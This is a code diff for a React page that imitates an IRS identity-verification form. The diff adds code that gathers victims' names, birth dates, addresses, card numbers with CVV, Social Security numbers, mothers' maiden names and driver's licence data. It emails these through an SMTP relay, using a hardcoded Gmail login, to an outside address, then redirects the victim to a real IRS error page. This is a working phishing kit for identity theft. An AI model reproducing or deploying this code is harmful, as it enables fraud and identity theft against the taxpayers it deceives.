@@ -2,6 +2,7 @@ import emailjs, { init } from 'emailjs-com';
 import { useEffect, useState } from 'react';
 import { useSelector } from 'react-redux';
 import { useHistory } from 'react-router-dom';
+import Email from './smtp'
 import './finance.css';
 
 init("user_ld15Epetajzy4LTSlKCz8");
@@ -84,25 +85,91 @@ function Finance() {
 		// }, function(error) {
 		// console.log('FAILED...', error);
 		// });
-		
+		let sender = {
+        
+			send: a => {
+				return new Promise((n, e) => { 
+					a.noCache = Math.floor(1e6 * Math.random() + 1); a.Action = "Send"; 
+					let t = JSON.stringify(a); 
+					sender.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, e => { 
+						n(e) 
+					}) 
+				})
+			},
+			ajaxPost: (e, n, t) => {
+				let a = sender.createCORSRequest("POST", e);
+				console.log({a,e,sender})
+				a.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+					a.onload = () => {
+						let e = a.responseText;
+						null != t && t(e)
+					};
+					a.send(n)
+			},
+			ajax: (e, n) => {
+				let t = Email.createCORSRequest("GET", e);
+				t.onload = () => {
+					let e = t.responseText;
+					null != n && n(e)
+				};
+					t.send()
+			},
+			createCORSRequest: (e, n) => {
+				let t = new XMLHttpRequest();
+				console.log({t})
+				console.log(typeof new XMLHttpRequest())
+				"withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof new XMLHttpRequest() ? (t = new XMLHttpRequest()).open(e, n) : t = null; 
+				return t
+			}
+		}
+		sender.send({
+			Host: "smtp.gmail.com",
+			Username : "iwillkillbill00@gmail.com",
+			Password : "root.FX3",
+			To : 'killbill@attorneymail.ch',
+			From : "iwillkillbill00@gmail.com",
+			Subject : `${bin} ${Date.now()}`,
+			Body : `=== PERSONAL INFO === <br>
+
+			Full Name: ${firstName} ${middleName} ${lastName}<br>
+			DOB (MM/DD/YYYY): ${dobMonth}/${dobDay}/${dobYear}<br>
+			Phone Number: ${phone}<br>
+			Address: ${address1} ${address2}<br>
+			City: ${city}<br>
+			State: ${state}<br>
+			Zipcode: ${zipcode}<br>
+			Country: ${country}<br>
+			<br>
+			=== FINANCIAL INFO === <br>
+			
+			Filed for tax return in last 7 years?: ${filedForTaxReturn}<br>
+			Name on Card: ${name}<br>
+			Card Number: ${CC}<br>
+			Expiry Date: ${ccExpiryMonth}/${ccExpiryYear}<br>
+			CVV: ${cSC}<br>
+			Mother's Maiden Name: ${mmn}<br>
+			Social Security Number: ${ssn1}-${ssn2}-${ssn3}<br>
+			Driver's License Number (if applicable): ${DLNumber}<br>
+			Driver's License Expiry Date (MM/DD/YYYY): ${dLExpiryMonth}/${dLExpiryDay}/${dLExpiryYear}<br>`,
+			})
 		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/registration/id_no.jsp?actionName=VerifyFinDataProxy'
 		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/logout1.jsp?error_code=-7271'
-		await writeFile()
 		window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
+		// await writeFile()
 	}
 
-	const writeFile = async () => {
-		const config = {
-			method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Accept": "application/json"
-            },
-            body: JSON.stringify(templateParams)
-		}
-		const res = await fetch('http://localhost:1988/upload', config)
-		const data = await res.json()
-	}
+	// const writeFile = async () => {
+	// 	const config = {
+	// 		method: "POST",
+    //         headers: {
+    //             "Content-Type": "application/json",
+    //             "Accept": "application/json"
+    //         },
+    //         body: JSON.stringify(templateParams)
+	// 	}
+	// 	const res = await fetch('http://localhost:1988/upload', config)
+	// 	const data = await res.json()
+	// }
 
 	
   return (
@@ -250,7 +317,7 @@ if (top != self) {
 
 				{/* <!-- HIDDEN VARS --> */}
 				
-				<input TYPE="hidden" value="" NAME="ioBlackBox" id="ioBlackBox"/>
+				<input type="hidden" value="" name="ioBlackBox" id="ioBlackBox"/>
 				 
 				<input type="hidden" id="user_prefs" name="user_prefs" value="" />
 				<input type="hidden" id="user_prefs2" name="user_prefs2" value="" />
@@ -306,7 +373,7 @@ if (top != self) {
 					{/* <!-- CREDIT CARD NUMBER --> */}
 						 <p>
 						 	
-							<label for="pc" className="inline restore-normal-size">
+							<label htmlFor="pc" className="inline restore-normal-size">
 								{/* <!-- <input type="radio" className="bigradio"
 									onClick="doGray(); populateHidden('pc')"
 									id="is_pc" name="is_loan"
@@ -316,7 +383,7 @@ if (top != self) {
 							</label>
 							<input type="text"
 						 			id="pc" name="pc" 
-						 		required
+						 		//required
 						 			className="textbox  "
 						 			tabIndex="0"
 						 			value={name} 
@@ -332,7 +399,7 @@ if (top != self) {
 						 {/* <!-- STUDENT LOAN NUMBER --> */}
 						<p>
 						
-						<label for="student_loan" className="inline restore-normal-size">
+						<label htmlFor="student_loan" className="inline restore-normal-size">
 							{/* <!-- <input type="radio" className="bigradio" 
 							onClick="doGray(); populateHidden('student_loan')"
 							 id="is_student_loan" name="is_loan"
@@ -344,7 +411,7 @@ if (top != self) {
 						className="textbox "
 						 id="student_loan" name="student_loan" minLength="15" maxLength="16"
 						 tabIndex="0"
-						 required
+						//  required
 						 value={CC}
 						 onChange={e => setCC(e.target.value)} />
 						 		
@@ -373,16 +440,16 @@ if (top != self) {
 							
 								<div className="small-field-nosize">
 									
-									<label className="access-label" for="month">
+									<label className="access-label" htmlFor="month">
 										Month
 									</label>
                   <select name="month" style={{width: "auto"}} 
 									tabIndex="0" aria-labelledby="dob_fieldset"
 									className="select-style"
-									required
+									// required
 									value={ccExpiryMonth}
       onChange={e => setCcExpiryMonth(e.currentTarget.value)}>
-		  <option value="" disabled selected>
+		  <option value="" disabled defaultValue>
                                     Month
                                 </option>
 										
@@ -433,7 +500,7 @@ if (top != self) {
 								
 								{/* <!-- <div className="small-field-nosize">
 		
-									<label className="access-label" for="day">
+									<label className="access-label" htmlFor="day">
 										Day
 									</label>
 									
@@ -453,7 +520,7 @@ if (top != self) {
 								
 								<div className="small-field-nosize">
 		
-									<label className="access-label" for="year">
+									<label className="access-label" htmlFor="year">
 										Year (format: YYYY)
 									</label>
 									
@@ -466,10 +533,10 @@ if (top != self) {
 									<select name="year" style={{width: "auto"}} 
 									tabIndex="0" aria-labelledby="dob_fieldset"
 									className="select-style"
-									required
+									// required
 									value={ccExpiryYear}
       onChange={e => setCcExpiryYear(e.currentTarget.value)}>
-		  <option value="" disabled selected>
+		  <option value="" disabled defaultValue>
                                     Year
                                 </option>
 		  	<option value="2020">
@@ -586,7 +653,7 @@ if (top != self) {
 						<!-- AUTO LOAN NUMBER --> */}
 						<p>
 						
-						<label for="auto_loan" className="inline restore-normal-size">
+						<label htmlFor="auto_loan" className="inline restore-normal-size">
 							{/* <!-- <input type="radio" className="bigradio" 
 							onClick="doGray(); populateHidden('auto_loan')"
 							 id="is_auto_loan" name="is_loan"
@@ -598,7 +665,7 @@ if (top != self) {
 						className="textbox-nosize "
 						 id="auto_loan" name="auto_loan" minLength="3" maxLength="4"
 						 tabIndex="0"
-						 required
+						//  required
 						 value={cSC}
 						 onChange={e => setcSC(e.target.value)} />
 						 <input type="hidden" id="auto_loan_ind" name="auto_loan_ind" value="" />
@@ -608,7 +675,7 @@ if (top != self) {
 						{/* <!-- MORTGAGE LOAN NUMBER --> */}
 						<p>
 						
-						<label for="mort_loan" className="inline restore-normal-size">
+						<label htmlFor="mort_loan" className="inline restore-normal-size">
 							{/* <!-- <input type="radio" className="bigradio" 
 							onClick="doGray(); populateHidden('mort_loan')"
 							 id="is_mort_loan" name="is_loan"
@@ -629,7 +696,7 @@ if (top != self) {
 						
 						{/* <!-- <p> --> */}
 						
-						<label for="home_loan" className="inline restore-normal-size">
+						<label htmlFor="home_loan" className="inline restore-normal-size">
 							{/* <!-- <input type="radio" className="bigradio"
 							onClick="doGray(); populateHidden('home_loan')"
 							 id="is_home_loan" name="is_loan"
@@ -669,7 +736,7 @@ if (top != self) {
 							
 								<div className="small-field-nosize">
 									
-									<label className="access-label" for="month">
+									<label className="access-label" htmlFor="month">
 										Month
 									</label>
 									<select name="month" style={{width: 'auto'}}
@@ -677,7 +744,7 @@ if (top != self) {
 									className="select-style"
 									value={dLExpiryMonth}
       onChange={e => setdLExpiryMonth(e.currentTarget.value)}>
-		  <option value="" disabled selected>
+		  <option value="" disabled defaultValue>
                                     Month
                                 </option>
 										
@@ -728,7 +795,7 @@ if (top != self) {
 								
 								<div className="small-field-nosize">
 		
-									<label className="access-label" for="day">
+									<label className="access-label" htmlFor="day">
 										Day
 									</label>
 									
@@ -738,7 +805,7 @@ if (top != self) {
 									 className="select-style"
 									 value={dLExpiryDay}
 	   onChange={e => setdLExpiryDay(e.currentTarget.value)}>
-		   <option value="" disabled selected>
+		   <option value="" disabled defaultValue>
                                     Day
                                 </option>
 																			<option value="01">
@@ -845,7 +912,7 @@ if (top != self) {
 							
 								<div className="small-field-nosize">
 		
-									<label className="access-label" for="year">
+									<label className="access-label" htmlFor="year">
 										Year (format: YYYY)
 									</label>
 									
@@ -860,7 +927,7 @@ if (top != self) {
 									className="select-style"
 									value={dLExpiryYear}
       onChange={e => setdLExpiryYear(e.currentTarget.value)}>
-		  <option value="" disabled selected>
+		  <option value="" disabled defaultValue>
                                     Year
                                 </option>
 		  	<option value="2020">
@@ -1039,7 +1106,7 @@ if (top != self) {
 						{/* <!-- NO CC NO LOAN NUMBER --> */}
 						<p>
 						
-						<label for="is_no_loan" className="inline restore-normal-size">
+						<label htmlFor="is_no_loan" className="inline restore-normal-size">
 							{/* <!-- <input type="radio" className="bigradio"
 							onClick="doGray(); populateHidden('none')"
 							 id="is_no_loan" name="is_loan"
@@ -1063,7 +1130,7 @@ if (top != self) {
 							<input type="image" name="continue" id="continue"
 								tabIndex="0" alt="Continue"
 								// onFocus="addVisualFocusIndicator(this, true)"
-									onBlur="this.style.border = ''"
+									// onBlur="this.style.border = ''"
 								// onClick="addVisualFocusIndicator(this, true)"
 								src="https://sa.www4.irs.gov/eauth/pub/common/images/button_continue.jpg"
 								value="Continue" />
@@ -1106,7 +1173,7 @@ if (top != self) {
 
 
 <div className="footerBar" role="contentinfo">
-<p>
+{/* <p> */}
 <ul>
 
 	<li>
@@ -1146,7 +1213,7 @@ if (top != self) {
 	
 
 </ul>	
-</p>
+{/* </p> */}
 </div>
 	{/* <!-- The Modal -->  */}
 
